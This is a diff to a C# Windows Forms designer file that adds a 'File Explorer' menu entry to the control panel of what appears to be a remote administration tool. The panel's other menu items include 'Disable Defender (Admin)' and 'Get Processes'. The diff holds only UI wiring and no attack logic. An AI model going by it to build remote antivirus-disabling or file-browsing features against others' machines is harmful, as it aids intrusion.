@@ -43,8 +43,9 @@
             this.closeServerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.visitSiteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.disableDefenderAdminToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.timer1 = new System.Windows.Forms.Timer(this.components);
             this.getProcessesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.timer1 = new System.Windows.Forms.Timer(this.components);
+            this.fileExplorerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.contextMenuList.SuspendLayout();
             this.SuspendLayout();
             // 
@@ -101,9 +102,10 @@
             this.closeServerToolStripMenuItem,
             this.visitSiteToolStripMenuItem,
             this.disableDefenderAdminToolStripMenuItem,
-            this.getProcessesToolStripMenuItem});
+            this.getProcessesToolStripMenuItem,
+            this.fileExplorerToolStripMenuItem});
             this.contextMenuList.Name = "contextMenuList";
-            this.contextMenuList.Size = new System.Drawing.Size(253, 224);
+            this.contextMenuList.Size = new System.Drawing.Size(253, 248);
             // 
             // sendMessageBoxToolStripMenuItem
             // 
@@ -154,18 +156,25 @@
             this.disableDefenderAdminToolStripMenuItem.Text = "Disable Defender (Admin)";
             this.disableDefenderAdminToolStripMenuItem.Click += new System.EventHandler(this.disableDefenderAdminToolStripMenuItem_Click);
             // 
-            // timer1
-            // 
-            this.timer1.Enabled = true;
-            this.timer1.Interval = 1000;
-            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
-            // 
             // getProcessesToolStripMenuItem
             // 
             this.getProcessesToolStripMenuItem.Name = "getProcessesToolStripMenuItem";
             this.getProcessesToolStripMenuItem.Size = new System.Drawing.Size(252, 24);
             this.getProcessesToolStripMenuItem.Text = "Get Processes";
             this.getProcessesToolStripMenuItem.Click += new System.EventHandler(this.getProcessesToolStripMenuItem_Click);
+            // 
+            // timer1
+            // 
+            this.timer1.Enabled = true;
+            this.timer1.Interval = 1000;
+            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
+            // 
+            // fileExplorerToolStripMenuItem
+            // 
+            this.fileExplorerToolStripMenuItem.Name = "fileExplorerToolStripMenuItem";
+            this.fileExplorerToolStripMenuItem.Size = new System.Drawing.Size(252, 24);
+            this.fileExplorerToolStripMenuItem.Text = "File Explorer";
+            this.fileExplorerToolStripMenuItem.Click += new System.EventHandler(this.fileExplorerToolStripMenuItem_Click);
             // 
             // MainForm
             // 
@@ -199,6 +208,7 @@
         private System.Windows.Forms.ColumnHeader columnHeader5;
         private System.Windows.Forms.ToolStripMenuItem disableDefenderAdminToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem getProcessesToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem fileExplorerToolStripMenuItem;
     }
 }
 
